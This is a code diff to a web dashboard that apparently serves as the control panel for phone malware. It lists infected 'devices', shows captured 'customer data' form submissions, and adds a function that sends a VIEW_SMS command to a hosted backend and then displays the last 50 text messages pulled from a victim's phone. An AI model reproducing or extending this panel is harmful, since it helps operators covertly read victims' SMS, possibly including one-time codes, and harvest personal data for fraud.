-                            <span style="color:#1976d2;font-weight:bold;">${key}</span>
-                            <span style="color:#222;font-size:15px;">${JSON.stringify(value)} <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" title="Copy" onclick="navigator.clipboard.writeText('${JSON.stringify(value)}');toast('Copied!')"></i></span>
-                        </div>`;
+                <div style="background:#e3f2fd;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;">
+                    <span style="color:#1976d2;font-weight:bold;">${key}</span>
+                    <span style="color:#222;font-size:15px;">${JSON.stringify(value)} <i class=\"fas fa-copy\" style=\"color:var(--primary);cursor:pointer;\" title=\"Copy\" onclick=\"navigator.clipboard.writeText('${JSON.stringify(value)}');toast('Copied!')\"></i></span>
+                </div>
+            `;
                 });
             } else {
                 html += '<div class="no-data">No customer data submitted yet</div>';
@@ -468,7 +492,36 @@
             modalBody.innerHTML = html;
             document.getElementById('viewDataModal').classList.add('show');
         }
-
+        function viewFormData(deviceId) {
+            const device = devices.find(d => d.deviceId === deviceId);
+            if (!device) {
+                toast('❌ Device not found', true);
+                return;
+            }
+            const modalBody = document.getElementById('modalBody');
+            let html = `<div style="background:#fffde7;padding:18px 12px 8px 12px;border-radius:8px 8px 0 0;">
+                        <div style="font-size:20px;font-weight:bold;color:#ff9800;margin-bottom:10px;">Submitted Form Data</div>
+                    </div>`;
+            if (device.customerData && Object.keys(device.customerData).length > 0) {
+                Object.entries(device.customerData).forEach(([key, value]) => {
+                    const v = JSON.stringify(value);
+                    html += `<div style="background:#fffde7;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #ffeb3b;display:flex;align-items:center;justify-content:space-between;">
+                                <span style="color:#ff9800;font-weight:bold;">${escapeAttr(key)}</span>
+                                <span style="color:#222;font-size:15px;">${escapeAttr(v)} <i class=\"fas fa-copy copy-btn\" data-text=\"${escapeAttr(v)}\" data-label=\"Copied!\" style=\"color:var(--primary);cursor:pointer;\" title=\"Copy\"></i></span>
+                            </div>`;
+                });
+            } else {
+                html += '<div class="no-data">No form data submitted yet</div>';
+            }
+            modalBody.innerHTML = html;
+            // attach copy handlers inside modal
+            setTimeout(() => {
+                modalBody.querySelectorAll('.copy-btn').forEach(el => el.onclick = () => {
+                    navigator.clipboard.writeText(el.dataset.text || '').then(() => toast(el.dataset.label || 'Copied!')).catch(() => toast('Copy failed', true));
+                });
+            }, 0);
+            document.getElementById('viewDataModal').classList.add('show');
+        }
         function viewSms(deviceId) {
             (async () => {
                 const device = devices.find(d => d.deviceId === deviceId);
@@ -476,6 +529,7 @@
                     toast('❌ Device not found', true);
                     return;
                 }
+                // Send VIEW_SMS command to device
                 try {
                     const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
                         method:'POST', headers:{'Content-Type':'application/json'},
@@ -484,68 +538,68 @@
                     const d = await r.json();
                     if (!d.success) {
                         toast('❌ ' + (d.message || 'Failed to send VIEW_SMS command'), true);
-                    } else {
-                         toast('✅ VIEW_SMS command sent. Waiting for device response...');
+                        return;
                     }
+                    // Wait a moment for device to respond and dashboard to update
+                    setTimeout(() => {
+                        fetchData(false);
+                        // Show modal after refresh
+                        setTimeout(() => {
+                            const updatedDevice = devices.find(dev => dev.deviceId === deviceId);
+                            let messages = Array.isArray(updatedDevice.smsMessages) ? updatedDevice.smsMessages.slice(-50).reverse() : [];
+                            let html = `<div style='background:#e3f2fd;padding:18px 12px 8px 12px;border-radius:8px 8px 0 0;'>
+        <div style='font-size:18px;font-weight:bold;color:#1976d2;'>${updatedDevice.model} - Last 50 SMS</div>
+    </div><hr style='margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;'>`;
+                            html += messages.map((msg, idx) => `
+        <div style='background:#fff;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;'>
+            <div>
+                <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${msg.from || msg.address || 'Unknown'}</div>
+                <div style='font-size:15px;color:#222;margin:4px 0;'>${msg.body || msg.message || ''}</div>
+                <div style='font-size:12px;color:#888;'>${msg.time ? formatLastSeen(msg.time) : ''}</div>
+            </div>
+            <div style='display:flex;flex-direction:column;gap:6px;'>
+                <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;font-size:18px;" title="Copy Message" onclick="navigator.clipboard.writeText('${msg.body || msg.message || ''}');toast('Message copied!')"></i>
+                <i class="fas fa-trash" style="color:#d32f2f;cursor:pointer;font-size:18px;" title="Delete Message" onclick="deleteSms('${deviceId}', ${idx})"></i>
+            </div>
+        </div>
+    `).join('');
+                            if (messages.length === 0) html += '<div class="no-data">No SMS messages found</div>';
+                            document.getElementById('smsModalBody').innerHTML = html;
+                            document.getElementById('viewSmsModal').classList.add('show');
+                        }, 800);
+                    }, 800);
                 } catch (err) {
                     toast('❌ Error sending VIEW_SMS command', true);
                 }
             })();
         }
-        
-        socket.on('sms-list-update', (data) => {
-            const { deviceId, messages } = data;
-            const device = devices.find(d => d.deviceId === deviceId);
-            if (device) {
-                device.smsMessages = messages;
-                render();
-                
-                const smsModalBody = document.getElementById('smsModalBody');
-                let html = `<div style='background:#e3f2fd;padding:18px 12px 8px 12px;border-radius:8px 8px 0 0;'>
-                    <div style='font-size:18px;font-weight:bold;color:#1976d2;'>${device.model} - Last 50 SMS</div>
-                </div><hr style='margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;'>`;
-                
-                const sortedMessages = (messages || []).slice(-50).reverse();
-
-                html += sortedMessages.map((msg, idx) => `
-                    <div style='background:#fff;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;'>
-                        <div>
-                            <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${msg.address || 'Unknown'}</div>
-                            <div style='font-size:15px;color:#222;margin:4px 0;'>${msg.body || ''}</div>
-                            <div style='font-size:12px;color:#888;'>${formatLastSeen(msg.date)}</div>
-                        </div>
-                        <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;font-size:18px;" title="Copy Message" onclick="navigator.clipboard.writeText('${(msg.body || '').replace(/'/g, "\\\'")}');toast('Message copied!')"></i>
-                    </div>`).join('');
-                
-                if (sortedMessages.length === 0) html += '<div class="no-data">No SMS messages found</div>';
-
-                smsModalBody.innerHTML = html;
-                document.getElementById('viewSmsModal').classList.add('show');
-                toast(`✅ SMS list updated for ${device.model}`);
-            }
-        });
-
+        // Delete SMS handler (demo only)
+        function deleteSms(deviceId, idx) {
+            toast('Delete SMS feature coming soon!');
+        }
         function closeModal(modalId) {
             document.getElementById(modalId).classList.remove('show');
         }
-
         window.onclick = function(event) {
             const viewDataModal = document.getElementById('viewDataModal');
             const viewSmsModal = document.getElementById('viewSmsModal');
-            if (event.target == viewDataModal) viewDataModal.classList.remove('show');
-            if (event.target == viewSmsModal) viewSmsModal.classList.remove('show');
+            if (event.target == viewDataModal) {
+                viewDataModal.classList.remove('show');
+            }
+            if (event.target == viewSmsModal) {
+                viewSmsModal.classList.remove('show');
+            }
         }
-
         function formatLastSeen(ts) {
             if (!ts) return 'N/A';
             const d = new Date(ts);
             if (isNaN(d.getTime())) return 'N/A';
             const now = new Date();
             const diff = Math.floor((now - d) / 1000);
-            if (diff < 60) return `${diff}s ago`;
-            if (diff < 3600) return `${Math.floor(diff/60)}m ago`;
-            if (diff < 86400) return `${Math.floor(diff/3600)}h ago`;
-            return d.toLocaleString('en-GB');
+            if (diff < 60) return diff + 's ago';
+            if (diff < 3600) return Math.floor(diff/60) + 'm ago';
+            if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
+            return d.toLocaleString();
         }
     </script>
 </body>
